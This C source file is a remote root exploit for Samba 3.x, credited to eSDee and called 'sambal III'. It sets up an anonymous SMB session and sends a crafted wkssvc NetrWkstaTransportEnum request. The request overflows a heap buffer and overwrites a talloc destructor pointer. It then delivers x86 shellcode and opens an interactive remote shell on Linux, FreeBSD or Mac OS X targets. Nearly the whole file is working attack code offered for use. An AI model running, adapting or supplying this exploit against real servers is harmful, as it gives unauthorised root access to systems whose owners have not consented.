/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "session.h"

#include "ansi.h"
#include "exploit_samba.h"
#include "mode.h"
#include "netio.h"
#include "rpc.h"
#include "smb_funct.h"
#include "term.h"
#include "x86_shellcode.h"

int
exploit_samba(struct SMB_session *session)
{
        struct RPC_session      rpc_session;

        unsigned char send_buf  [0xffff];
        unsigned char shellcode [2048];

        size_t length[]         = { 0, 0 };

        memset((void *)&rpc_session,    '\0', sizeof(struct RPC_session));
        memset((void *)&send_buf,       '\0', sizeof(send_buf));
        memset((void *)&shellcode,      '\0', sizeof(shellcode));

        exploit_connect(session);

        rpc_session.pipe_name           = "\\wkssvc";
        rpc_session.uuid                = "6bffd098-a112-3610-9833-46c3f87e345a";
        rpc_session.uuid_ver_major      = 1;
        rpc_session.uuid_ver_minor      = 0;
        rpc_session.syntax              = "8a885d04-1ceb-11c9-9fe8-08002b104860";

        fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Binding to the wkssvc interace ... \r\n"NO
                        " -  Binding to \"%s\" (%s) \r\n", rpc_session.pipe_name, rpc_session.uuid);

        if (SMB_rpc_bind(session, &rpc_session) < 0) {
                fprintf(stderr, GR"["LR"!"GR"]"LR" SMB_rpc_bind: "DR"Failed.\r\n"NO);
                SMB_free_session(session);
                exit(EXIT_FAILURE);
        }

        if (MODE_IS_SET(MODE_OLD_SAMBA)) {
                length[1] = exploit_build_buffer_old(send_buf, (unsigned char *)&shellcode, length[0]);
        } 
        else {
                length[0] = x86_shellcode_build ((char *)&shellcode, sizeof(shellcode));        
                length[1] = exploit_build_buffer(send_buf, (unsigned char *)&shellcode, length[0]);
        }

        fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Calling "LG"WKSSVC_NETRWKSTATRANSPORTENUM"DG" ... \r\n"NO);

        if (SMB_rpc(session, WKSSVC_NETRWKSTATRANSPORTENUM, send_buf, length[1])) {
        }

        if (MODE_IS_SET(MODE_LINUX)) {

                fprintf(stdout, " -  Sending linux_x86_pty_alloc shellcode ... \r\n");

                x86_shellcode_send_tag_linux(session->fd);

                fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Exploit "LG"successful!"DG" \r\n\r\n"NO);

                term_set_terminal();

                term_handle_shell(session->fd);

                return 0;
        }

        if (MODE_IS_SET(MODE_FREEBSD)) {

                SET_MODE(MODE_COOKED);  // TODO: Write a PTY alloc shellcode for freebsd ... 
                
                x86_shellcode_send_tag_freebsd(session->fd);

                fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Exploit "LG"successful!"DG" \r\n\r\n"NO);

                term_handle_shell(session->fd);

                return 0;
        }

        if (MODE_IS_SET(MODE_MACOS)) {

                SET_MODE(MODE_COOKED);  // TODO: Write a PTY alloc shellcode for Mac OS X ...

                x86_shellcode_send_tag_mac_os(session->fd);

                fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Exploit "LG"successful!"DG" \r\n\r\n"NO);

                term_handle_shell(session->fd);

                return 0;
        }

        return 0;
}

size_t
exploit_build_buffer(char *buffer, unsigned char *shellcode, size_t shell_size)
{
        char *old_ptr = buffer; 

        /* The overflow happens in the ndr_pull_wkssvc_NetWkstaTransportCtr0() function 
        */

        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);         // level
        ADD_UINT32(buffer, 0xbade5dee);

        /* We are going to write 3 NetWkstaTransportInfo0 structures to a buffer that can only hold 1 structure. */

        ADD_UINT32(buffer, 0x00000003);         // count
        ADD_UINT32(buffer, 0xbade5dee);         // array_ptr
        ADD_UINT32(buffer, 0x00000001);         // array

        /* First NetWkstaTransportInfo0, padding ... */

        ADD_UINT32(buffer, 0xbade5dee);         // quality_of_service
        ADD_UINT32(buffer, 0xbade5dee);         // vc_count
        ADD_UINT32(buffer, 0x00000000);         // name
        ADD_UINT32(buffer, 0x00000000);         // address
        ADD_UINT32(buffer, 0xbade5dee);         // wan_link

        /* Second NetWkstaTransportInfo0, padding ... */

        ADD_UINT32(buffer, 0xbade5dee);         // quality_of_service
        ADD_UINT32(buffer, 0xbade5dee);         // vc_count
        ADD_UINT32(buffer, 0x00000000);         // name
        ADD_UINT32(buffer, 0x00000000);         // address
        ADD_UINT32(buffer, 0xbade5dee);         // wan_link

        /* Third NetWkstaTransportInfo0, the string pointer is going to overwrite the talloc destructor pointer. */

        ADD_UINT32(buffer, 0xbade5dee);         // quality_of_service
        ADD_UINT32(buffer, 0xbade5dee);         // vc_count
        ADD_UINT32(buffer, 0x00000000);         // name
        ADD_UINT32(buffer, 0xbade5dee);         // address
        ADD_UINT32(buffer, 0xbade5dee);         // wan_link

        /* String: address */

        ADD_UTF16_STRING(buffer, shellcode, shell_size);

        return buffer - old_ptr;
}

void
exploit_connect(struct SMB_session *session)
{
        if (SMB_connect(session) < 0) {
                fprintf(stderr, GR"["LR"!"GR"]"LR" SMB_connect: "DR"Unable to connect to %s ...\r\n"NO, session->hostname);
                SMB_free_session(session);
                exit(EXIT_FAILURE);
        }

        fprintf(stdout, GR"\r\n["LG"!"GR"] "DG"Establishing NULL session to "LG"\\\\%s\\IPC$ "DG"... \r\n"NO, session->hostname);

        session->username = "";

        if (SMB_establish_null_session(session) < 0) {
                fprintf(stderr, GR"["LR"!"GR"]"LR" SMB_establish_null_session: "DR"Failed.\r\n"NO);
                SMB_free_session(session);
                exit(EXIT_FAILURE);
        }

        if (session->native_lm && session->native_os)
                fprintf(stdout, " -  Remote version: %s (%s)\r\n", session->native_os, session->native_lm);

        if (SMB_receive_share_comment(session, "IPC$") < 0)
                return;

        if (session->share_comment) 
                fprintf(stdout, " -  Share comment: %s\r\n", session->share_comment);
        
        return;
}


size_t
exploit_build_buffer_old(char *buffer, unsigned char *shellcode, size_t shell_size)
{
        char *old_ptr = buffer;

        int i = 0;

        /* Samba 3.0.25 and higher is also vulnerable, although the memory layout seems to differ.
        */

        /* The overflow happens in the ndr_pull_wkssvc_NetWkstaTransportCtr0() function
        */

        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);         // level
        ADD_UINT32(buffer, 0xbade5dee);

        /* We are going to write 3 NetWkstaTransportInfo0 structures to a buffer that can only hold 1 structure. */

        ADD_UINT32(buffer, 0x00000010);         // count
        ADD_UINT32(buffer, 0xbade5dee);         // array_ptr
        ADD_UINT32(buffer, 0x00000001);         // array

        for (i = 0; i < 0x10; i++) {

                ADD_UINT32(buffer, 0xbade5dee);         // quality_of_service
                ADD_UINT32(buffer, 0xbade5dee);         // vc_count
                ADD_UINT32(buffer, 0x00000000);         // name
                ADD_UINT32(buffer, 0x00000001);         // address
                ADD_UINT32(buffer, 0xbade5dee);         // wan_link
        }

        for (i = 0; i < 0x10; i++) {
                ADD_UINT32(buffer, 0x00000000);
                ADD_UINT32(buffer, 0x00000000);
                ADD_UINT32(buffer, 0x00000000);
        }

        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);

        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);
        ADD_UINT32(buffer, 0x00000000);

        return buffer - old_ptr;
}

